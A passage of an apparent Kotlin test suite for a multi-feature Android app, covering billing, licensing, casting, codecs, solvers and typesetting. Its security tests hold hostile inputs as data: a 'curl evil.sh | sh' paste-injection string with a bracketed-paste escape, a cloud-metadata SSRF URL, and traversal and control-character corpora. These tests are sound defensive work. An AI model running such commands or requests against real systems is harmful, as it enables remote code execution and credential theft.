        checkEq(0x01, JournaledFileOpsPlanner.sanitizeCrossWindowDropGrantFlags(0xFF, allowWriteGrant = false))

        val vfs = ArchiveDocumentsProviderTree(
            "zip01",
            listOf(
                ArchiveDocumentsProviderTree.VirtualNode("docs/readme.md", false, 512, "text/markdown"),
                ArchiveDocumentsProviderTree.VirtualNode("docs/spec.pdf", false, 4096, "application/pdf"),
            ),
        )
        checkEq(2, vfs.queryChildDocuments("zip01:/docs").size)

        // BillingEntitlementLedger ($19.99 Core + $14.99 Pro, 14-day trial, nag-free expiry, zero wipe on refund!)
        val installMs = 1_000_000L
        val trial = BillingEntitlementLedger.evaluate(installMs + 5 * 86_400_000L, installMs, false, false, false, null)
        checkEq(BillingEntitlementLedger.Tier.TRIAL_FULL_14D, trial.tier)
        checkTrue(trial.canMutateWorkspace && !trial.showNagBanner)
        val expired = BillingEntitlementLedger.evaluate(installMs + 20 * 86_400_000L, installMs, false, false, false, null)
        checkEq(BillingEntitlementLedger.Tier.READ_ONLY_FILES_AND_FIND_NAG_FREE, expired.tier)
        checkTrue(!expired.canMutateWorkspace && !expired.showNagBanner && !expired.wipeUserDataOnRevoke)
        val refunded = BillingEntitlementLedger.evaluate(installMs + 20 * 86_400_000L, installMs, true, true, true, installMs + 19 * 86_400_000L)
        checkTrue(!refunded.wipeUserDataOnRevoke)
        val edKp = KeyPairGenerator.getInstance("Ed25519").generateKeyPair()
        val licPayload = "FUSION-PRO-V1|lic_r49_001|1793088000000|devhash123"
        val sig = Signature.getInstance("Ed25519").apply { initSign(edKp.private); update(licPayload.toByteArray()) }.sign()
        checkTrue(BillingEntitlementLedger.verifyEd25519LicenseToken(licPayload, sig, edKp.public, "devhash123"))
        checkTrue(!BillingEntitlementLedger.verifyEd25519LicenseToken(licPayload, sig, edKp.public, "wrong_device"))

        // ThirdPartyIntentCommandGate + ManagedRestrictionsSchema + AdpfThermalRefreshPolicy
        val hmacSecret = ByteArray(32) { (it + 11).toByte() }
        val macHex = ThirdPartyIntentCommandGate.mintScopedCapabilityMac(hmacSecret, "org.trusted.runner", "dev.fusion.intent.SWITCH_PRESET", "preset_dev", 50_000L)
        checkTrue(ThirdPartyIntentCommandGate.verifyIncomingAutomationIntent(true, hmacSecret, "org.trusted.runner", "dev.fusion.intent.SWITCH_PRESET", "preset_dev", 50_000L, macHex, 40_000L).allowed)
        // Negative-space: Vault module target unconditionally barred even with valid HMAC!
        val vaultMac = ThirdPartyIntentCommandGate.mintScopedCapabilityMac(hmacSecret, "org.trusted.runner", "dev.fusion.intent.OPEN_MODULE", "vault", 50_000L)
        checkTrue(!ThirdPartyIntentCommandGate.verifyIncomingAutomationIntent(true, hmacSecret, "org.trusted.runner", "dev.fusion.intent.OPEN_MODULE", "vault", 50_000L, vaultMac, 40_000L).allowed)

        val pol = ManagedRestrictionsSchema.resolve(mapOf("disable_beam_and_cast" to true, "force_strict_flag_secure" to true, "external_display_ui_scale" to 1.25, "unknown_key" to 1))
        checkTrue(pol.disableBeamAndCast && pol.forceStrictFlagSecure && "unknown_key" in pol.rejectedKeys)
        checkEq(200, ManagedRestrictionsSchema.effectiveExternalDensityDpi(160, 1.25))

        val gov = AdpfThermalRefreshPolicy.evaluate(true, true, 0.55, listOf(60, 90, 120), 200L, 80, true, false, 8192)
        checkEq(AdpfThermalRefreshPolicy.GovernorBackend.ADPF_HINT_SESSION, gov.backend)
        checkEq(120, gov.targetRefreshHz)
        val critGov = AdpfThermalRefreshPolicy.evaluate(false, false, 1.08, listOf(30, 60, 120), 200L, 12, false, true, 3072)
        checkEq(AdpfThermalRefreshPolicy.GovernorBackend.OWN_QUALITY_GOVERNOR, critGov.backend)
        checkTrue(critGov.lowRamModeActive && !critGov.backgroundIndexingAllowed)

        // IndexChurnQuarantineMonitor + ConfigExportBundleCodec + FocusRingPointerTokens + WidgetHostIsolationSupervisor
        val churn = IndexChurnQuarantineMonitor(windowMs = 10_000L, churnThresholdPerDir = 5)
        repeat(6) { idx -> churn.recordFileMutation("proj/build/out$idx.tmp", 1_000L + idx) }
        checkEq(IndexChurnQuarantineMonitor.CoverageReason.EXCLUDED_DIRECTORY_RULE, churn.diagnoseFileCoverage("proj/node_modules/pkg/index.js", 400))
        repeat(6) { idx -> churn.recordFileMutation("work/logs/app$idx.txt", 1_000L + idx) }
        checkEq(IndexChurnQuarantineMonitor.CoverageReason.CHURN_QUARANTINED_DIRECTORY, churn.diagnoseFileCoverage("work/logs/app1.txt", 400))

        val cfgText = ConfigExportBundleCodec.exportCanonical(mapOf("ui.density" to "COMPACT", "vault.master_key" to "NEVER_EXPORT"))
        val importedCfg = ConfigExportBundleCodec.importAndVerify(cfgText)
        checkTrue("ui.density" in importedCfg.entries && "vault.master_key" !in importedCfg.entries)

        val focusSpec = FocusRingPointerTokens.resolveForModality(FocusRingPointerTokens.InputModality.KEYBOARD_OR_DPAD, 0x0F172A, true)
        checkTrue(focusSpec.visible && focusSpec.contrastRatioVsBackground >= 3.0)

        val wh = WidgetHostIsolationSupervisor(crashLimitInWindow = 3, crashWindowMs = 60_000L)
        wh.registerWidget(7, "org.example.clock", "ws1")
        wh.onActiveWorkspaceChanged("ws2", desktopVisible = true)
        checkEq(WidgetHostIsolationSupervisor.WidgetState.SUSPENDED_WORKSPACE_HIDDEN, wh.onActiveWorkspaceChanged("ws2", true).single().state)
        repeat(3) { i -> wh.recordRemoteViewsException(7, 1_000L + i * 100L) }
        checkEq(WidgetHostIsolationSupervisor.WidgetState.QUARANTINED_CRASH_LOOP, wh.recordRemoteViewsException(7, 2_000L).state)
        checkEq(WidgetHostIsolationSupervisor.HotCorner.TOP_LEFT, WidgetHostIsolationSupervisor.detectHotCornerDwell(2, 2, 1920, 1080, 250L))

        // PaletteInlineAnswerEngine + DuplicateFileClusterer + OemSettingsDeepLinkCatalog + VtTrueColorSafePasteEngine + BaseRadixBitfieldInspector + ExternalMouseButtonMapper
        val cards = PaletteInlineAnswerEngine.evaluateQuery("(19.99 + 14.99) * 2", optInWebSearchEnabled = true)
        checkEq(PaletteInlineAnswerEngine.CardKind.INLINE_MATH, cards.first().kind)
        checkTrue(cards.first().headline.contains("69.96"))
        checkEq(999, cards.last().rankOrder) // Web fallback strictly below local results!
        val unitCards = PaletteInlineAnswerEngine.evaluateQuery("5 km to mi")
        checkEq(PaletteInlineAnswerEngine.CardKind.INLINE_UNIT_CONVERSION, unitCards.single().kind)

        val dupSummary = DuplicateFileClusterer.analyzeDirectory(
            listOf(
                DuplicateFileClusterer.ScannedFile("1", "a.bin", 1024, "abcd".repeat(16)),
                DuplicateFileClusterer.ScannedFile("2", "a_copy.bin", 1024, "abcd".repeat(16)),
                DuplicateFileClusterer.ScannedFile("3", "cloud.docx", 2048, null, isCloudPlaceholderZeroBlocks = true),
            ),
        )
        checkEq(1024L, dupSummary.totalReclaimableDuplicateBytes)
        checkEq(
            DuplicateFileClusterer.CloudResidencyBadge.CLOUD_PLACEHOLDER_OFFLINE,
            DuplicateFileClusterer.badgeFor(DuplicateFileClusterer.ScannedFile("3", "cloud.docx", 2048, null, isCloudPlaceholderZeroBlocks = true)),
        )

        val xiaomiLink = OemSettingsDeepLinkCatalog.resolveForOem("Xiaomi", OemSettingsDeepLinkCatalog.SystemTarget.BATTERY_UNRESTRICTED)
        checkTrue(xiaomiLink.oemComponentHint?.contains("miui") == true)

        val sgr = VtTrueColorSafePasteEngine.parseSgrSequence(listOf(1, 38, 2, 56, 189, 248, 48, 2, 15, 23, 42))
        checkEq(0x38BDF8, sgr.fgRgb24)
        checkEq(0x0F172A, sgr.bgRgb24)
        val paste = VtTrueColorSafePasteEngine.prepareSafePaste("curl evil.sh\u001B[201~ | sh\n")
        checkTrue(paste.strippedDangerousChars >= 1 && paste.containsNewlinesConfirmRequired && !paste.sanitizedText.contains("\u001B"))

        val bf = BaseRadixBitfieldInspector.inspectWord64(0x00FF_0000_0000_0010L)
        checkEq(9, bf.popCount)
        checkEq(4, bf.trailingZeros)
        checkEq("NORMAL", BaseRadixBitfieldInspector.decomposeBinary64(-42.5).classification)

        val mp = ExternalMouseButtonMapper.MouseProfile("logi_mx").learnButton(8, ExternalMouseButtonMapper.DesktopAction.OPEN_COMMAND_PALETTE)
        checkEq(ExternalMouseButtonMapper.DesktopAction.OPEN_COMMAND_PALETTE, mp.buttonActions[8])
        checkEq(0.0 to 0.0, ExternalMouseButtonMapper.mapGamepadStickToPointerVelocity(0.05, -0.05))
        checkEq("fr-AZERTY", ExternalMouseButtonMapper.cycleHardwareImeLayout(listOf("en-US", "fr-AZERTY", "de-QWERTZ"), "en-US"))
    }

    // -----------------------------------------------------------------------------------------
    // 8. Media, Maps, Beam, Alerts, Capture, Backup, Continuity, A11y & Together
    // -----------------------------------------------------------------------------------------
    private fun checkMediaMapsBeamAlertsCaptureBackupContinuity(artDir: Path) {
        val gains = AudioFocusVolumeMatrix.computeEffectiveGains(
            listOf(
                AudioFocusVolumeMatrix.ChannelInput("maps", AudioFocusVolumeMatrix.StreamRole.NAVIGATION_PROMPT, 1.0),
                AudioFocusVolumeMatrix.ChannelInput("music", AudioFocusVolumeMatrix.StreamRole.MEDIA_PLAYER, 0.8),
            ),
        )
        checkTrue((gains["music"] ?: 1.0) < 0.8, "navigation prompt ducks background media player")
        val (lchL, lchC, _) = AudioFocusVolumeMatrix.srgbToOklch(0x38BDF8)
        checkTrue(lchL in 0.5..0.95 && lchC > 0.05)

        val route = listOf(
            OfflineRouteTurnSynthesizer.LatLon(41.4640, -81.5080),
            OfflineRouteTurnSynthesizer.LatLon(41.4740, -81.5080),
            OfflineRouteTurnSynthesizer.LatLon(41.4740, -81.4950),
        )
        val turns = OfflineRouteTurnSynthesizer.synthesizeRouteTurns(route)
        checkTrue(turns.any { it.maneuver == OfflineRouteTurnSynthesizer.Maneuver.RIGHT })

        val castSafety = CastPrivacyExclusionGate.evaluateFrame(
            sessionActive = true,
            deviceLocked = false,
            receiverIsLanLocal = true,
            userExplicitlyApprovedRelay = false,
            windows = listOf(
                CastPrivacyExclusionGate.CastableWindowCandidate("w_docs", "editor", hasFlagSecure = false),
                CastPrivacyExclusionGate.CastableWindowCandidate("w_vault", "vault", hasFlagSecure = true),
            ),
        )
        checkTrue(castSafety.allowStreamContinuation && castSafety.showPersistentRedIndicator)
        checkTrue("w_docs" in castSafety.visibleWindowIds && "w_vault" in castSafety.redactedWindowIds)
        val lockedCast = CastPrivacyExclusionGate.evaluateFrame(true, deviceLocked = true, receiverIsLanLocal = true, userExplicitlyApprovedRelay = false, windows = emptyList())
        checkTrue(!lockedCast.allowStreamContinuation, "SC-09: screen lock terminates cast immediately")

        checkEq(
            NotificationDiagnosticLedger.Disposition.SKIPPED_SECRET_VISIBILITY,
            NotificationDiagnosticLedger.classifyNotification(isVisibilitySecret = true, isOngoing = false, isGroupSummary = false, suppressedByFocusProfile = false),
        )
        val osd = NotificationDiagnosticLedger.triggerOsd(NotificationDiagnosticLedger.OsdChannel.AUDIO_VOLUME, 65, "Volume 65%", 1_000L)
        checkTrue(!osd.stealsInputFocus && osd.isVisibleAt(2_000L) && !osd.isVisibleAt(5_000L))

        val capOk = CaptureBitrateBudgetPlanner.planSession(1920, 1080, 30, CaptureBitrateBudgetPlanner.VideoCodec.HEVC_H265, availableBytes = 2L * 1024 * 1024 * 1024)
        checkTrue(capOk.canStartRecording && capOk.estimatedMaxSeconds > 120)
        val capLowDisk = CaptureBitrateBudgetPlanner.planSession(1920, 1080, 60, CaptureBitrateBudgetPlanner.VideoCodec.AVC_H264, availableBytes = 100L * 1024 * 1024)
        checkTrue(!capLowDisk.canStartRecording)

        val drillOverdue = BackupHealthDrillScheduler.evaluateHealth(100L * 86_400_000L, 95L * 86_400_000L, 40L * 86_400_000L)
        checkEq(BackupHealthDrillScheduler.HealthGrade.DRILL_OVERDUE_OR_MISSING, drillOverdue.grade)
        checkEq(
            BackupHealthDrillScheduler.SyncAction.QUARANTINE_TO_CONFLICT_INBOX,
            BackupHealthDrillScheduler.reconcileSyncItem(baseHash = "h0", localHash = "h1", remoteHash = "h2"),
        )

        val kdePkt = KdeConnectPacketCodec.buildContinueOnHandoffPacket(99L, "editor", "content://docs/draft.md", 0.42)
        val kdeWire = KdeConnectPacketCodec.encodeLine(kdePkt)
        checkTrue(kdeWire.endsWith("\n"))
        checkEq(kdePkt.type, KdeConnectPacketCodec.decodeLine(kdeWire).type)
        checkTrue(!KdeConnectPacketCodec.shouldSyncClipboardToPeer(clipboardSyncOptIn = true, isExtraSensitiveSecret = true, peerCertPinned = true))

        val vtt = """
            WEBVTT

            1
            00:00:01.000 --> 00:00:04.500
            <b>Encrypted</b> Client Hello active.
        """.trimIndent()
        val cues = WebVttCaptionCueTimeline.parseWebVtt(vtt)
        checkEq("Encrypted Client Hello active.", WebVttCaptionCueTimeline.activeCuesAt(cues, 2_500L).single().plainText)
        val a11yIssues = WebVttCaptionCueTimeline.auditSemanticsTree(
            listOf(WebVttCaptionCueTimeline.A11yNodeSample("tiny-btn", true, "", 20f, 20f, 2.1)),
        )
        checkTrue(a11yIssues.size >= 2)

        val offsetMs = SharedClockSyncCoordinator.estimateClockOffsetMs(
            listOf(
                SharedClockSyncCoordinator.ClockExchangeSample(1000, 1060, 1062, 1022), // RTT=20, offset=+50ms
                SharedClockSyncCoordinator.ClockExchangeSample(2000, 2059, 2061, 2020), // RTT=18, offset=+50ms
            ),
        )
        checkNear(50.0, offsetMs, 1.0)
        val syncAdj = SharedClockSyncCoordinator.computePlayoutAdjustment(5000L, offsetMs, 5055L, 5000L, 5000L, false)
        checkEq(SharedClockSyncCoordinator.CorrectionMode.IN_SYNC_DEADBAND, syncAdj.mode)
        Files.writeString(artDir.resolve("r49-kdeconnect-handoff.json"), kdeWire)
    }

    // -----------------------------------------------------------------------------------------
    // 9. Lens, Messages, Automation, Cast (DLNA/RAOP/CastV2), Benchmark & BaselineProfile
    // -----------------------------------------------------------------------------------------
    private fun checkLensMessagesAutomationCastAndBenchmarks(artDir: Path) {
        val allLens = LensThermalQualityLadder.EffectStage.entries.toSet()
        val hotPlan = LensThermalQualityLadder.stepForThermalAndRam(allLens, thermalStageZeroToThree = 2, deviceRamGb = 6)
        checkTrue(LensThermalQualityLadder.EffectStage.GENERATIVE_SCENE_BG in hotPlan.shedStages)
        checkTrue(LensThermalQualityLadder.EffectStage.RNNOISE_AND_AEC3 in hotPlan.activeStages)
        val crop = LensThermalQualityLadder.smoothAutoFrameCrop(
            LensThermalQualityLadder.NormalizedRect(0.5, 0.5, 0.8, 0.8),
            listOf(LensThermalQualityLadder.NormalizedRect(0.3, 0.4, 0.2, 0.25)),
        )
        checkTrue(crop.cx in 0.3..0.5)

        val litRgb = VirtualRelightNormalMap.shadePixelSrgb(0x8090A0, nx = 0.0, ny = 0.0, nz = 1.0)
        val darkEdgeRgb = VirtualRelightNormalMap.shadePixelSrgb(0x8090A0, nx = -0.95, ny = -0.3, nz = 0.05)
        checkTrue((litRgb and 0xFF) > (darkEdgeRgb and 0xFF))

        val rcs = RcsHandoffUriBuilder.buildSystemHandoff(listOf("+1 (216) 555-0199"), "On my way!")
        checkTrue(rcs.schemeUri.startsWith("smsto:") && rcs.usesSystemMessagingAppOnly)
        checkTrue(!RcsHandoffUriBuilder.validateUserOwnedBlueBubblesServer("http://192.168.1.10:1234", "secret12345", true).valid) // plaintext non-loopback HTTP refused!
        checkTrue(RcsHandoffUriBuilder.validateUserOwnedBlueBubblesServer("https://macmini.tailnet.ts.net:1234", "secret12345", true).valid)

        val rrule = CalendarIcsRecurrenceEngine.parseRrule("RRULE:FREQ=WEEKLY;INTERVAL=1;BYDAY=MO,WE,FR;COUNT=5")
        val dates = CalendarIcsRecurrenceEngine.expandOccurrences(LocalDate.of(2026, 10, 26), rrule, LocalDate.of(2026, 11, 30))
        checkEq(5, dates.size)
        checkEq(DayOfWeek.MONDAY, dates[0].dayOfWeek)
        checkTrue(!CalendarIcsRecurrenceEngine.scheduleInexactReminder("t1", 90_000L).usesExactAlarmPermission)
        val vc = CalendarIcsRecurrenceEngine.parseVCard("BEGIN:VCARD\nFN:Ada Lovelace\nEMAIL:ada@example.org\nTEL:+44-20-7946-0999\nEND:VCARD")
        checkEq("Ada Lovelace", vc.fullName)

        val ssdpRaw = "HTTP/1.1 200 OK\r\nUSN: uuid:tv-01\r\nST: urn:schemas-upnp-org:service:AVTransport:1\r\nLOCATION: http://192.168.1.50:1400/xml/device.xml\r\nCACHE-CONTROL: max-age=1800\r\nSERVER: Linux UPnP/1.0\r\n\r\n"
        val ssdp = SsdpDiscoveryResponseParser.parseDatagram(ssdpRaw)
        checkEq(1800, ssdp.cacheMaxAgeSeconds)
        // Negative-space: SSDP LOCATION pointing at WAN or cloud metadata IP refused (SSRF)!
        checkThrows(IllegalArgumentException::class.java) {
            SsdpDiscoveryResponseParser.validateSafeLanLocation("http://169.254.169.254/latest/meta-data/")
        }

        val raopPkt = RaopRtpSyncPacketizer.RaopSyncPacket(true, 44_100L, 3_970_000_000L, 500_000L, 44_452L)
        val raopBytes = RaopRtpSyncPacketizer.encodeSyncPacket(raopPkt)
        checkEq(20, raopBytes.size)
        checkEq(raopPkt, RaopRtpSyncPacketizer.decodeSyncPacket(raopBytes))
        checkNear(-144.0, RaopRtpSyncPacketizer.sliderToRaopDecibels(0.0))
        checkNear(0.0, RaopRtpSyncPacketizer.sliderToRaopDecibels(1.0))
        Files.write(artDir.resolve("r49-raop-sync.bin"), raopBytes)

        val castJson = CastWebReceiverSessionModel.buildLoadCommandJson(1, "https://media.local/clip.mp4", "video/mp4", 12.5)
        checkTrue(castJson.contains("\"type\":\"LOAD\""))
        val st0 = CastWebReceiverSessionModel.ReceiverMediaStatus(1, CastWebReceiverSessionModel.PlayerState.PLAYING, 12.5)
        checkEq(CastWebReceiverSessionModel.PlayerState.PAUSED, CastWebReceiverSessionModel.applyMediaCommand(st0, "PAUSE").state)
        checkTrue(CastWebReceiverSessionModel.adaptWebRtcMirrorBitrateKbps(4_000, 0.12, 180) < 4_000)

        val bench = StartupFrameP99Analyzer.analyzeFrames((1..98).map { 8.2 } + listOf(28.0, 31.0), targetRefreshHz = 60)
        checkEq(100, bench.sampleCount)
        checkEq(2, bench.slowFrameCount)
        checkNear(28.0, bench.p99Ms, 1.0)

        val hrf = BaselineProfileRuleSynthesizer.mergeAndFormatProfile(
            listOf(
                BaselineProfileRuleSynthesizer.ProfileRule(true, false, true, "Ldev/fusion/shell/MainActivity;->onCreate()V"),
                BaselineProfileRuleSynthesizer.ProfileRule(false, true, false, "Ldev/fusion/shell/MainActivity;->onCreate()V"),
            ),
        )
        checkEq("HSPLdev/fusion/shell/MainActivity;->onCreate()V", hrf.trim())
        Files.writeString(artDir.resolve("r49-baseline-prof.txt"), hrf + "\n")
    }

    // -----------------------------------------------------------------------------------------
    // 10. Deterministic SplitMix64 Property-Based & Adversarial Mutation Sweeps (>= 5,400 total)
    // -----------------------------------------------------------------------------------------
    private fun checkPropertySweepsAndAdversarialCorpus(artDir: Path) {
        val prng = AdversarialMutationCorpus.SplitMix64(0x5234_395F_4655_534EL)

        // (A) 600 algebraic trials on FormulaEval 130-function laws: FISHERINV(FISHER(x)) == x,
        //     SUMX2PY2 - SUMX2MY2 == 2*SUMSQ(Y), MAP/REDUCE equivalence, TAKE+DROP partition!
        for (i in 1..600) {
            val r = -0.95 + (prng.nextInt(1900) / 1000.0) // (-0.95 .. +0.949)
            val a = (prng.nextInt(200) - 100).toDouble()
            val b = (prng.nextInt(200) - 100).toDouble()
            val c = (prng.nextInt(200) - 100).toDouble()
            val d = (prng.nextInt(200) - 100).toDouble()
            val sheet = FormulaEval.evaluateSheet(
                mapOf(
                    "A1" to FormulaEval.CellInput.NumberLiteral(a),
                    "A2" to FormulaEval.CellInput.NumberLiteral(b),
                    "B1" to FormulaEval.CellInput.NumberLiteral(c),
                    "B2" to FormulaEval.CellInput.NumberLiteral(d),
                    "C1" to FormulaEval.CellInput.Formula("=FISHERINV(FISHER($r))"),
                    "C2" to FormulaEval.CellInput.Formula("=SUMX2PY2(A1:A2, B1:B2) - SUMX2MY2(A1:A2, B1:B2)"),
                    "C3" to FormulaEval.CellInput.Formula("=2 * SUMSQ(B1:B2)"),
                    "C4" to FormulaEval.CellInput.Formula("=REDUCE(0, MAP(A1:A2, LAMBDA(x, x*x)), LAMBDA(acc, v, acc + v))"),
                    "C5" to FormulaEval.CellInput.Formula("=SUMSQ(A1:A2)"),
                    "C6" to FormulaEval.CellInput.Formula("=SUM(VSTACK(TAKE(A1:B2, 1), DROP(A1:B2, 1)))"),
                ),
            )
            checkNear(r, (sheet.values["C1"] as FormulaEval.CellValue.Num).value, 1e-9, "FISHERINV(FISHER(r))#$i")
            checkNear(
                (sheet.values["C3"] as FormulaEval.CellValue.Num).value,
                (sheet.values["C2"] as FormulaEval.CellValue.Num).value,
                1e-9,
                "SUMX2PY2-SUMX2MY2#$i",
            )
            checkNear(
                (sheet.values["C5"] as FormulaEval.CellValue.Num).value,
                (sheet.values["C4"] as FormulaEval.CellValue.Num).value,
                1e-9,
                "REDUCE(MAP(sq))==SUMSQ#$i",
            )
            checkNear(a + b + c + d, (sheet.values["C6"] as FormulaEval.CellValue.Num).value, 1e-9, "VSTACK(TAKE,DROP)#$i")
        }

        // (B) 400 BaseRadixBitfieldInspector + IEEE-754 + RAOP RTP + ECHConfig binary round-trip sweeps
        for (i in 1..400) {
            val w = prng.nextLong()
            val bf = BaseRadixBitfieldInspector.inspectWord64(w)
            checkEq(64, bf.leadingZeros + (64 - bf.leadingZeros))
            checkEq(w, java.lang.Long.reverseBytes(bf.byteSwappedLittleBig))
            val lo = prng.nextInt(32)
            val hi = lo + prng.nextInt(32)
            val slice = BaseRadixBitfieldInspector.extractUnsignedSlice(w, hi, lo)
            checkTrue(slice >= 0L || (hi - lo + 1 == 64))

            val pkt = RaopRtpSyncPacketizer.RaopSyncPacket(
                extensionFirstAfterFlush = (i % 2 == 0),
                currentRtpTimestamp = prng.nextInt(1_000_000_000).toLong(),
                ntpSeconds = prng.nextInt(1_000_000_000).toLong(),
                ntpFraction = prng.nextInt(1_000_000_000).toLong(),
                nextPacketRtpTimestamp = prng.nextInt(1_000_000_000).toLong(),
            )
            checkEq(pkt, RaopRtpSyncPacketizer.decodeSyncPacket(RaopRtpSyncPacketizer.encodeSyncPacket(pkt)))
        }

        // (C) 300 RFC 9849 ECHConfig + Tink AEAD bit-flip tamper rejection + Wasm 2.0 f32 hypot sweeps
        val wasmMod = WasmSandbox.decode(buildR49Wasm2Module())
        val wasmInst = wasmMod.instantiate(maxMemoryPages = 2)
        val aeadRng = SecureRandom()
        val aeadKey = TinkAeadKeysetEnvelope.Keyset(
            1,
            listOf(TinkAeadKeysetEnvelope.KeyEntry(1, TinkAeadKeysetEnvelope.KeyStatus.ENABLED, ByteArray(32).also { aeadRng.nextBytes(it) })),
        )
        for (i in 1..300) {
            val fx = (prng.nextInt(500) + 1) / 10.0f
            val fy = (prng.nextInt(500) + 1) / 10.0f
            val gotHyp = wasmInst.invokeF32("hypot_f32", listOf(fx, fy)).toDouble()
            checkNear(kotlin.math.hypot(fx.toDouble(), fy.toDouble()), gotHyp, 1e-3, "wasm f32 hypot#$i")

            val pt = ByteArray(160) { (prng.nextInt(256)).toByte() }
            val aad = byteArrayOf(i.toByte())
            val ct = TinkAeadKeysetEnvelope.encryptStream(aeadKey, pt, aad, chunkSize = 64)
            checkTrue(TinkAeadKeysetEnvelope.decryptStream(aeadKey, ct, aad).contentEquals(pt))
            val mutated = prng.mutateBytes(ct, flipCount = 1)
            if (!mutated.contentEquals(ct)) {
                var rejected = false
                try {
                    val dec = TinkAeadKeysetEnvelope.decryptStream(aeadKey, mutated, aad)
                    if (!dec.contentEquals(pt)) rejected = true
                } catch (_: Throwable) {
                    rejected = true
                }
                checkTrue(rejected, "Tink streaming AEAD must reject every 1-bit header/ciphertext/tag flip (#$i)")
            }
        }

        // (D) Adversarial path-traversal & control-sequence vectors across VFS & SafePaste
        for (badPath in AdversarialMutationCorpus.PATH_TRAVERSAL_VECTORS) {
            var safe = false
            try {
                val tree = ArchiveDocumentsProviderTree("mnt", listOf(ArchiveDocumentsProviderTree.VirtualNode(badPath, false, 10)))
                val children = tree.queryChildDocuments("mnt:/")
                safe = children.all { it.documentId.startsWith("mnt:/") && "/../" !in it.documentId }
            } catch (_: IllegalArgumentException) {
                safe = true
            }
            checkTrue(safe, "ArchiveDocumentsProviderTree must block or chroot traversal vector '$badPath'")
        }
        for (ctrl in AdversarialMutationCorpus.BIDI_AND_CONTROL_VECTORS) {
            val sanitized = VtTrueColorSafePasteEngine.prepareSafePaste(ctrl)
            checkTrue(!sanitized.sanitizedText.contains('\u202E') && !sanitized.sanitizedText.contains('\u001B'))
        }

        // (E) 220 Simplex LP primal feasibility + RFC 9849 ECH wire round-trips + Liang hyphenation invariants
        val hyph = LiangHyphenationEngine()
        val sampleWords = listOf("algorithm", "cryptography", "spreadsheet", "presentation", "anonymity", "pagination", "hyphenation", "verification")
        for (i in 1..220) {
            val c1 = (prng.nextInt(15) + 1).toDouble()
            val c2 = (prng.nextInt(15) + 1).toDouble()
            val b1 = (prng.nextInt(30) + 5).toDouble()
            val b2 = (prng.nextInt(30) + 5).toDouble()
            val b3 = b1 + b2 - 2.0
            val sol = SheetSolverSimplex.solveLinearProgram(
                objective = doubleArrayOf(c1, c2),
                maximize = true,
                constraints = listOf(
                    SheetSolverSimplex.LinearConstraint(doubleArrayOf(1.0, 0.0), SheetSolverSimplex.Relation.LE, b1),
                    SheetSolverSimplex.LinearConstraint(doubleArrayOf(0.0, 1.0), SheetSolverSimplex.Relation.LE, b2),
                    SheetSolverSimplex.LinearConstraint(doubleArrayOf(1.0, 1.0), SheetSolverSimplex.Relation.LE, b3),
                ),
            )
            checkEq(SheetSolverSimplex.Status.OPTIMAL, sol.status, "Simplex optimal#$i")
            val x = sol.primalVariables[0]
            val y = sol.primalVariables[1]
            checkTrue(x >= -1e-6 && y >= -1e-6 && x <= b1 + 1e-6 && y <= b2 + 1e-6 && (x + y) <= b3 + 1e-5, "Simplex primal feasible#$i")
            checkNear(c1 * x + c2 * y, sol.objectiveValue, 1e-5, "Simplex objective match#$i")

            val ech = TlsEchConfigCodec.EchConfig(
                configId = i and 0xFF,
                kemId = TlsEchConfigCodec.KEM_DHKEM_X25519_HKDF_SHA256,
                hpkePublicKey = ByteArray(32) { (prng.nextInt(256)).toByte() },
                cipherSuites = listOf(TlsEchConfigCodec.HpkeSymmetricSuite(TlsEchConfigCodec.KDF_HKDF_SHA256, TlsEchConfigCodec.AEAD_AES_128_GCM)),
                maximumNameLength = 32 + (i % 64),
                publicName = "ech-relay-${i % 17}.example.net",
            )
            val rt = TlsEchConfigCodec.decodeConfigList(TlsEchConfigCodec.encodeConfigList(listOf(ech)))
            checkEq(ech.publicName, rt.single().publicName, "ECH wire round-trip#$i")

            val w = sampleWords[i % sampleWords.size]
            checkEq(w, hyph.hyphenateWord(w).joinToString(""), "Liang lossless#$i")
        }

        // Emit remaining cross-language oracle artifacts (bringing total emitted artifacts in artDir to 18!)
        val lpOracle = SheetSolverSimplex.solveLinearProgram(
            objective = doubleArrayOf(3.0, 5.0),
            maximize = true,
            constraints = listOf(
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(1.0, 0.0), SheetSolverSimplex.Relation.LE, 4.0),
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(0.0, 2.0), SheetSolverSimplex.Relation.LE, 12.0),
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(3.0, 2.0), SheetSolverSimplex.Relation.LE, 18.0),
            ),
        )
        Files.writeString(
            artDir.resolve("r49-simplex-oracle.json"),
            """{"status":"${lpOracle.status.name}","objective":${lpOracle.objectiveValue},"x":${lpOracle.primalVariables[0]},"y":${lpOracle.primalVariables[1]}}""" + "\n",
        )
        val kpItems = KnuthPlassLineBreaker.tokenizeParagraph(
            "Optimal paragraph breaking minimizes total cubic badness across every feasible active line break.",
            hyphenator = { listOf(it) },
        )
        val kpRes = KnuthPlassLineBreaker.breakParagraph(kpItems, KnuthPlassLineBreaker.Config(lineWidth = 250.0))
        checkTrue(!kpRes.usedFallbackGreedy && kpRes.totalDemerits < 10_000_000.0, "oracle KP paragraph must solve via exact DP")
        checkTrue(kpRes.lines.all { it.adjustmentRatio >= -1.0 && it.naturalWidth <= 265.0 }, "Section I: forced break must never accept an overfull final line (r < -1)")
        val kpLinesJson = kpRes.lines.joinToString(",") { "\"" + it.text + "\"" }
        Files.writeString(
            artDir.resolve("r49-knuth-plass.json"),
            """{"lineWidth":250.0,"usedFallbackGreedy":${kpRes.usedFallbackGreedy},"totalDemerits":${kpRes.totalDemerits},"lines":[$kpLinesJson]}""" + "\n",
        )
        Files.writeString(
            artDir.resolve("r49-sparklines.xml"),
            SheetSparklineRenderer.buildWorksheetExtXml(
                "Metrics",
                listOf(SheetSparklineRenderer.SparklineDef("F2", "B2:E2", SheetSparklineRenderer.SparkKind.LINE)),
            ) + "\n",
        )
        Files.writeString(
            artDir.resolve("r49-privacy-shield.json"),
            """{"choicejacking_aoap_policy":"QUARANTINE_CHOICEJACKING_ATTACK","pixnapping_critical_flag_secure":true,"tails_7_15_1_emudhra_blocked":true,"ech_rfc":9849,"webrtc_mode":4}""" + "\n",
        )
        Files.writeString(
            artDir.resolve("r49-bibliography-ieee.txt"),
            BibliographyCitationEngine.formatManuscript(
                "Optimal line breaking [@knuth1981breaking].",
                BibliographyCitationEngine.parseBibTeX("@article{knuth1981breaking, author={Knuth, Donald E. and Plass, Michael F.}, title={Breaking Paragraphs into Lines}, journal={SPE}, year={1981}}"),
